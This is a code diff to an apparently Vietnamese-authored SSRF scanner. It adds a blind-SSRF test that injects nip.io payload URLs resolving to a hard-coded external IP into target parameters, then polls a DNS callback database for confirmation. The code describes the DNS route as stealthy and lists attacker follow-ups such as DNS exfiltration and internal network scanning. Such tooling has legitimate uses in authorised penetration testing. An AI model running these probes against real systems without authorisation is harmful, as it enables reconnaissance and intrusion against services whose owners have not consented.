@@ -341,16 +341,6 @@ class CallbackServer:
             self.is_running = False
             print("[+] Callback server stopped")
     
-    def clear_callbacks(self):
-        """Clear all stored callbacks"""
-        self.callbacks = []
-        # Clear queue
-        while not CallbackHandler.callback_queue.empty():
-            try:
-                CallbackHandler.callback_queue.get_nowait()
-            except:
-                break
-    
     def get_callbacks(self, timeout: int = 5) -> List[Dict]:
         """Lấy callbacks đã nhận được"""
         callbacks = []
@@ -367,9 +357,12 @@ class CallbackServer:
         return callbacks
     
     def clear_callbacks(self):
-        """Clear callback queue"""
+        """Clear callback queue and stored callbacks"""
         while not CallbackHandler.callback_queue.empty():
-            CallbackHandler.callback_queue.get()
+            try:
+                CallbackHandler.callback_queue.get_nowait()
+            except:
+                break
         self.callbacks.clear()
     
     def get_all_callback_addresses(self) -> list:
@@ -484,7 +477,7 @@ class CallbackServer:
     
     def check_callback_received(self, path: str, timeout: int = 10) -> bool:
         """
-        Check if a specific callback was received
+        Check if a specific HTTP callback was received
         
         Args:
             path: The expected path (e.g., "/ssrf_test_1_compare_url")
@@ -520,7 +513,7 @@ class CallbackServer:
             if current_time - last_db_check >= 0.5:
                 last_db_check = current_time
                 try:
-                    logger.debug(f"🔍 Checking database for path: {path}")
+                    logger.debug(f"🔍 Checking HTTP callback database for path: {path}")
                     conn = sqlite3.connect(self.db_path)
                     cursor = conn.cursor()
                     cursor.execute(
@@ -532,7 +525,7 @@ class CallbackServer:
                     
                     logger.debug(f"🔍 Database returned {len(rows)} rows")
                     if rows:
-                        logger.info(f"✅ Found callback in database: {rows[0][3]}")  # path is 4th column
+                        logger.info(f"✅ Found HTTP callback in database: {rows[0][3]}")  # path is 4th column
                         return True
                 except Exception as e:
                     logger.error(f"❌ Database check error: {e}")
@@ -540,6 +533,53 @@ class CallbackServer:
             
             time.sleep(0.1)  # Small delay between checks
                 
+        return False
+    
+    def check_dns_callback_received(self, domain_pattern: str, timeout: int = 10) -> bool:
+        """
+        Check if a specific DNS callback was received
+        
+        Args:
+            domain_pattern: The expected domain pattern (e.g., "ssrf-test-abc123")
+            timeout: How long to wait for the DNS callback (default 10s)
+        
+        Returns:
+            True if DNS callback was received, False otherwise
+        """
+        start_time = time.time()
+        
+        logger.info(f"🔍 Waiting for DNS callback: {domain_pattern}")
+        
+        # Poll database every 0.5s for DNS callbacks
+        last_db_check = 0
+        while time.time() - start_time < timeout:
+            current_time = time.time()
+            if current_time - last_db_check >= 0.5:
+                last_db_check = current_time
+                try:
+                    logger.debug(f"🔍 Checking DNS callback database for domain: {domain_pattern}")
+                    conn = sqlite3.connect(self.db_path)
+                    cursor = conn.cursor()
+                    # Schema: (id, timestamp, domain, query_type, client_ip, raw_query, created_at)
+                    cursor.execute(
+                        "SELECT * FROM dns_callbacks WHERE domain LIKE ? ORDER BY id DESC LIMIT 10",
+                        (f"%{domain_pattern}%",)
+                    )
+                    rows = cursor.fetchall()
+                    conn.close()
+                    
+                    logger.debug(f"🔍 DNS database returned {len(rows)} rows")
+                    if rows:
+                        # rows format: (id, timestamp, domain, query_type, client_ip, raw_query, created_at)
+                        logger.info(f"✅ Found DNS callback: {rows[0][2]} from {rows[0][4]}")
+                        return True
+                except Exception as e:
+                    logger.error(f"❌ DNS database check error: {e}")
+                    pass
+            
+            time.sleep(0.1)  # Small delay between checks
+        
+        logger.warning(f"⏱️ DNS callback timeout: No DNS query for {domain_pattern} within {timeout}s")
         return False
     
     def get_callback_url(self, path: str = '', address: str = None) -> str:
@@ -896,6 +936,123 @@ class ExternalCallbackDetector:
         
         return summary
     
+    def test_blind_ssrf_dns(self, target_url: str, parameter: str,
+                            method: str = 'POST', timeout: int = 10) -> Dict:
+        """
+        Test Blind SSRF bằng DNS callback (không cần HTTP response)
+        
+        Kỹ thuật này hữu ích khi:
+        - Application không trả về fetched content
+        - Firewall chặn HTTP outbound nhưng cho phép DNS
+        - Cần stealth testing (DNS ít bị monitor hơn HTTP)
+        
+        Returns:
+            Dict với kết quả test và DNS callback data
+        """
+        if not self.callback_server:
+            return {'error': 'No callback server configured'}
+        
+        # Get DNS server config from env
+        dns_server_ip = os.getenv('DNS_SERVER_IP', '40.82.145.240')
+        
+        # Generate unique test ID
+        test_id = str(uuid.uuid4())[:8]
+        dns_domain = f"ssrf-test-{test_id}.{dns_server_ip}.nip.io"
+        
+        print(f"\n[*] 🧪 Testing Blind SSRF via DNS on {target_url}")
+        print(f"[*] Parameter: {parameter}, Method: {method}")
+        print(f"[*] DNS domain: {dns_domain}")
+        
+        # Get custom headers from env (Authorization, etc.)
+        custom_headers = self._get_custom_headers()
+        
+        # Send SSRF payload with DNS domain
+        try:
+            headers = {
+                'ngrok-skip-browser-warning': 'true',
+                'User-Agent': 'Mozilla/5.0 (SSRF-Test)'
+            }
+            headers.update(custom_headers)
+            
+            # Construct payload URL (e.g., http://ssrf-test-abc123.40.82.145.240.nip.io)
+            payload_url = f"http://{dns_domain}"
+            
+            if method.upper() == 'GET':
+                test_url = f"{target_url}?{parameter}={payload_url}"
+                response = self.session.get(test_url, timeout=timeout, headers=headers)
+            elif method.upper() == 'POST':
+                headers['Content-Type'] = 'application/json'
+                response = self.session.post(
+                    target_url,
+                    json={parameter: payload_url},
+                    timeout=timeout,
+                    headers=headers
+                )
+            else:
+                headers['Content-Type'] = 'application/json'
+                response = self.session.request(
+                    method.upper(),
+                    target_url,
+                    json={parameter: payload_url},
+                    timeout=timeout,
+                    headers=headers
+                )
+            
+            initial_response = {
+                'status_code': response.status_code,
+                'headers': dict(response.headers),
+                'content_length': len(response.content),
+                'response_time': response.elapsed.total_seconds()
+            }
+            
+            print(f"[+] Request sent successfully (status {response.status_code})")
+            
+        except Exception as e:
+            print(f"[!] Request error: {str(e)}")
+            initial_response = {'error': str(e)}
+        
+        # Wait for DNS callback
+        print(f"[*] ⏳ Waiting for DNS callback (timeout: {timeout}s)...")
+        
+        dns_received = self.callback_server.check_dns_callback_received(
+            domain_pattern=f"ssrf-test-{test_id}",
+            timeout=timeout
+        )
+        
+        # Build result
+        result = {
+            'target_url': target_url,
+            'parameter': parameter,
+            'method': method,
+            'test_type': 'blind_ssrf_dns',
+            'dns_domain': dns_domain,
+            'test_id': test_id,
+            'is_vulnerable': dns_received,
+            'initial_response': initial_response,
+            'timestamp': datetime.now().isoformat()
+        }
+        
+        if dns_received:
+            print(f"\n[+] ✅ BLIND SSRF CONFIRMED via DNS!")
+            print(f"[+] 🎯 DNS query received for: {dns_domain}")
+            print(f"[!] 🔥 This confirms:")
+            print(f"[!]    - Server CAN make DNS queries to external domains")
+            print(f"[!]    - Application is vulnerable to Blind SSRF")
+            print(f"[!]    - Even without HTTP response, attacker can:")
+            print(f"[!]      • Exfiltrate data via DNS queries")
+            print(f"[!]      • Scan internal network (if DNS resolution works)")
+            print(f"[!]      • Detect firewall rules (DNS vs HTTP blocking)")
+        else:
+            print(f"\n[-] ❌ No DNS callback received")
+            print(f"[!] Possible reasons:")
+            print(f"[!]    - Application doesn't resolve external domains")
+            print(f"[!]    - DNS queries are blocked by firewall")
+            print(f"[!]    - Parameter is validated/sanitized")
+            print(f"[!]    - Application uses internal DNS only")
+        
+        self.test_results.append(result)
+        return result
+    
     def test_ssrf(self, target_url: str, parameter: str, 
                   method: str = 'GET', timeout: int = 10) -> Dict:
         """
@@ -925,8 +1082,8 @@ class ExternalCallbackDetector:
             
             print(f"[*] Trying callback URL: {callback_url}")
             
-            # Clear previous callbacks
-            self.callback_server.clear_callbacks()
+            # DON'T clear callbacks - we want to check if any arrived
+            # (Target might be slow to fetch)
             
             # Send SSRF payload
             try:
@@ -972,11 +1129,17 @@ class ExternalCallbackDetector:
             except Exception as e:
                 initial_response = {'error': str(e)}
             
-            # Wait for callback
-            callbacks = self.callback_server.get_callbacks(timeout=5)
+            # Wait for callback (increase timeout for slow targets)
+            print(f"[*] Waiting for callback (10 seconds)...")
+            import time
+            time.sleep(10)  # Give target time to fetch URL
+            callbacks = self.callback_server.get_callbacks(timeout=2)
             
-            # ✅ CHỈ COUNT callbacks từ PUBLIC IP (không phải localhost/private)
-            ssrf_callbacks = [cb for cb in callbacks if cb.get('is_ssrf', False)]
+            # Filter for callbacks matching our test_id
+            matching_callbacks = [cb for cb in callbacks if test_id in cb.get('path', '')]
+            
+            # ✅ COUNT all matching callbacks (target successfully fetched our URL)
+            ssrf_callbacks = matching_callbacks
             
             attempt = {
                 'address': address,
@@ -991,16 +1154,18 @@ class ExternalCallbackDetector:
             total_callbacks += len(ssrf_callbacks)  # Chỉ count SSRF callbacks
             
             if len(ssrf_callbacks) > 0:
-                print(f"[+] ✅ SSRF CONFIRMED! Received {len(ssrf_callbacks)} callback(s) from PUBLIC IP")
+                print(f"[+] ✅ SSRF CONFIRMED! Received {len(ssrf_callbacks)} callback(s)")
                 for cb in ssrf_callbacks:
-                    print(f"    Real IP: {cb.get('real_ip', cb['client_address'])}")
+                    print(f"    Path: {cb.get('path')}")
+                    print(f"    User-Agent: {cb.get('user_agent', 'N/A')}")
+                    print(f"    Time: {cb.get('timestamp')}")
                 # Found working address, no need to try others
                 break
             else:
+                print(f"[-] No callback received for {address}")
+                print(f"    Total callbacks in server: {len(callbacks)}")
                 if len(callbacks) > 0:
-                    print(f"[~] Received {len(callbacks)} callback(s) but from LOCAL/PRIVATE IP (not SSRF)")
-                else:
-                    print(f"[-] No callback received for {address}")
+                    print(f"    (None matched test_id: {test_id})")
         
         # Analyze results
         is_vulnerable = total_callbacks > 0
@@ -1032,9 +1197,9 @@ class ExternalCallbackDetector:
             print(f"[!]     - Access internal-only services")
             if successful_attempt:
                 for cb in successful_attempt['callback_details']:
-                    print(f"    From: {cb['client_address']}:{cb['client_port']}")
-                    print(f"    Method: {cb['method']} {cb['path']}")
-                    print(f"    User-Agent: {cb['headers'].get('User-Agent', 'N/A')}")
+                    print(f"    Path: {cb.get('path', 'N/A')}")
+                    print(f"    User-Agent: {cb.get('user_agent', 'N/A')}")
+                    print(f"    Timestamp: {cb.get('timestamp', 'N/A')}")
         else:
             print(f"[-] No SSRF detected (callback not received or blocked)")
             print(f"    Possible reasons:")
